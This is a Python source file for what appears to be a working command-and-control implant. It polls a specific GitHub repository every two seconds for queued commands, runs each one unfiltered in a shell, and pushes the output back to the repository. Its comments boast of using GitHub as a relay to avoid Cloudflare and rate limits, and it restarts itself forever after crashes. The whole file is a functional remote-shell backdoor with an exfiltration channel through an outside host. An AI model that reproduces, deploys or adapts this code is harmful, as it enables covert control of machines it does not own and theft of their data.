#!/usr/bin/env python3
"""
C2 Worker v9 — GitHub Relay (NO Cloudflare, NO Rate Limits)
Uses GitHub repo as command/output queue instead of Base44 backend function.

GitHub API: 5000 req/hour (plenty)
Poll interval: 2s = 1800 req/hour (well within limits)

Flow:
  Kali → writes command to c2-bridge/c2_queue.json via GitHub API
  Worker → polls c2_queue.json, executes, writes output to c2_output.json
  Kali → reads c2_output.json for results
"""

import requests
import subprocess
import time
import json
import os
import base64
import sys
from datetime import datetime

GITHUB_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", "")
REPO = "Youssefzdb/c2-bridge"
QUEUE_FILE = "c2_queue.json"
OUTPUT_FILE = "c2_output.json"
POLL_INTERVAL = 2  # seconds
CMD_TIMEOUT = 300  # 5 minutes max per command
WORKSPACE = os.getcwd()

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open("c2_worker.log", "a") as f:
        f.write(line + "\n")

def github_get_file(path):
    """Get file content + SHA from GitHub repo"""
    url = f"https://api.github.com/repos/{REPO}/contents/{path}"
    try:
        resp = requests.get(url, headers={
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            content = base64.b64decode(data["content"]).decode("utf-8")
            sha = data["sha"]
            return content, sha
        elif resp.status_code == 404:
            return None, None
        else:
            log(f"GitHub GET error: {resp.status_code}")
            return None, None
    except Exception as e:
        log(f"GitHub GET exception: {e}")
        return None, None

def github_put_file(path, content, sha=None, message="C2 update"):
    """Create or update file in GitHub repo"""
    url = f"https://api.github.com/repos/{REPO}/contents/{path}"
    encoded = base64.b64encode(content.encode("utf-8")).decode("utf-8")
    payload = {
        "message": message,
        "content": encoded,
    }
    if sha:
        payload["sha"] = sha
    
    try:
        resp = requests.put(url, headers={
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }, json=payload, timeout=15)
        
        if resp.status_code in (200, 201):
            return True
        else:
            log(f"GitHub PUT error: {resp.status_code} — {resp.text[:200]}")
            return False
    except Exception as e:
        log(f"GitHub PUT exception: {e}")
        return False

def github_delete_file(path, sha, message="C2 cleanup"):
    """Delete file from GitHub repo"""
    url = f"https://api.github.com/repos/{REPO}/contents/{path}"
    try:
        resp = requests.delete(url, headers={
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }, json={
            "message": message,
            "sha": sha
        }, timeout=15)
        return resp.status_code in (200, 204)
    except:
        return False

def execute_command(command):
    """Execute ANY command — no filters, no blocks"""
    log(f"Executing: {command[:150]}")
    
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            cwd=WORKSPACE
        )
        
        try:
            output, _ = proc.communicate(timeout=CMD_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            output = f"[TIMEOUT: {CMD_TIMEOUT}s — killed]"
        
        if not output:
            output = "(no output)"
        elif len(output) > 100000:
            # GitHub file size limit is 100MB, but keep reasonable
            output = output[:100000] + "\n... [truncated at 100KB]"
        
        log(f"Done ({len(output)} chars)")
        return output
        
    except Exception as e:
        err = f"Error: {e}"
        log(err)
        return err

def main():
    log("=" * 60)
    log("C2 Worker v9 — GITHUB RELAY (No Cloudflare)")
    log(f"Repo: {REPO}")
    log(f"Poll: {POLL_INTERVAL}s | Timeout: {CMD_TIMEOUT}s")
    log("No Cloudflare. No rate limits. Pure GitHub relay.")
    log("=" * 60)
    
    if not GITHUB_TOKEN:
        log("FATAL: GITHUB_ACCESS_TOKEN not set")
        sys.exit(1)
    
    # Verify GitHub access
    try:
        resp = requests.get(f"https://api.github.com/repos/{REPO}",
            headers={"Authorization": f"Bearer {GITHUB_TOKEN}"},
            timeout=10)
        if resp.status_code != 200:
            log(f"FATAL: Cannot access repo ({resp.status_code})")
            sys.exit(1)
        log("GitHub repo accessible. Ready for commands.")
    except Exception as e:
        log(f"FATAL: GitHub check failed: {e}")
        sys.exit(1)
    
    last_queue_sha = None
    
    while True:
        try:
            # Poll for commands
            content, sha = github_get_file(QUEUE_FILE)
            
            if content and sha and sha != last_queue_sha:
                last_queue_sha = sha
                
                try:
                    cmd_data = json.loads(content)
                except:
                    cmd_data = {"command": content}
                
                cmd_id = cmd_data.get("id", "")
                command = cmd_data.get("command", "")
                timestamp = cmd_data.get("timestamp", "")
                
                if command and cmd_data.get("status") == "pending":
                    log(f"Received [{cmd_id}]: {command[:100]}")
                    
                    # Execute
                    output = execute_command(command)
                    
                    # Write output to GitHub
                    result = {
                        "id": cmd_id,
                        "command": command,
                        "output": output,
                        "status": "completed",
                        "timestamp": datetime.now().isoformat(),
                    }
                    
                    # Get existing output file SHA (if exists)
                    _, out_sha = github_get_file(OUTPUT_FILE)
                    github_put_file(OUTPUT_FILE, json.dumps(result, indent=2), 
                                  sha=out_sha, 
                                  message=f"C2 output [{cmd_id}]")
                    
                    # Delete/clear the queue file
                    github_delete_file(QUEUE_FILE, sha, message=f"C2 done [{cmd_id}]")
                    last_queue_sha = None  # Reset so we detect new file
                    
                    log("Output written. Queue cleared. Ready.")
            
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            log("Shutting down...")
            break
        except Exception as e:
            log(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            log(f"Crashed: {e}. Restart in 3s...")
            time.sleep(3)
